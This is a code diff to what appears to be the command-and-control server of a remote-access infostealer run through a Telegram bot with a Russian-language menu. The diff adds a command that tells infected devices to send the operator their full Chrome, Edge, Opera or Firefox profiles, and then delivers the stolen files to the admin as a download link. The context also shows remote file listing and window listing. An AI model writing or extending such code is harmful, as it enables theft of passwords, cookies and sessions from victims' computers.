@@ -24,6 +24,7 @@ import cv2
 import numpy as np
 import shutil
 from fastapi.staticfiles import StaticFiles
+import uuid
 
 bot_instance = None
 
@@ -735,16 +736,31 @@ class ServerBot:
                 reply_markup=InlineKeyboardMarkup(keyboard))
         elif action == "browsers_menu":
             keyboard = [
-                [InlineKeyboardButton("Google Chrome", callback_data=f"action_{device_id}_browser:chrome")],
-                [InlineKeyboardButton("Microsoft Edge", callback_data=f"action_{device_id}_browser:edge")],
-                [InlineKeyboardButton("Opera", callback_data=f"action_{device_id}_browser:opera")],
-                [InlineKeyboardButton("Mozilla Firefox", callback_data=f"action_{device_id}_browser:firefox")],
+                [InlineKeyboardButton("Google Chrome (полный профиль)", callback_data=f"action_{device_id}_browser_full:chrome")],
+                [InlineKeyboardButton("Microsoft Edge (полный профиль)", callback_data=f"action_{device_id}_browser_full:edge")],
+                [InlineKeyboardButton("Opera (полный профиль)", callback_data=f"action_{device_id}_browser_full:opera")],
+                [InlineKeyboardButton("Mozilla Firefox (полный профиль)", callback_data=f"action_{device_id}_browser_full:firefox")],
                 [InlineKeyboardButton("🔙 Назад", callback_data=f"action_{device_id}_files_menu")]
             ]
             await self.application.bot.send_message(
                 chat_id=chat_id,
-                text="Выберите браузер для сбора данных:",
-                reply_markup=InlineKeyboardMarkup(keyboard))
+                text="Выберите браузер для скачивания полного профиля:",
+                reply_markup=InlineKeyboardMarkup(keyboard)
+            )
+        
+        elif action.startswith("browser_full:"):
+            browser = action.split(":")[1]
+            with sqlite3.connect(DATABASE) as conn:
+                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
+                        (device_id, f"browser_full:{browser}"))
+            
+            await self.application.bot.send_message(
+                chat_id=chat_id,
+                text=f"Запрос полного профиля {browser} отправлен. Это может занять несколько минут...",
+                reply_markup=InlineKeyboardMarkup([
+                    [InlineKeyboardButton("🔄 Обновить", callback_data=f"device_{device_id}")]
+                ])
+            )
         elif action.startswith("ls:"):
             path = action.split(":", 1)[1]
             with sqlite3.connect(DATABASE) as conn:
@@ -958,6 +974,18 @@ async def command_result(request: Request):
         await bot_instance.application.bot.send_message(
             chat_id=ADMIN_IDS[0],
             text="Список окон:",
+            reply_markup=InlineKeyboardMarkup(keyboard)
+        )
+    elif data.get('file_type') == 'url':
+        keyboard = [
+            [InlineKeyboardButton("⬇️ Скачать файл", url=data['result'])]
+        ]
+        
+        await bot_instance.application.bot.send_message(
+            chat_id=ADMIN_IDS[0],
+            text=f"✅ Файл готов к скачиванию\n\n"
+                 f"📁 Имя файла: {os.path.basename(data['result'])}\n"
+                 f"🔗 Ссылка действительна 24 часа",
             reply_markup=InlineKeyboardMarkup(keyboard)
         )
     elif file_type == 'file':
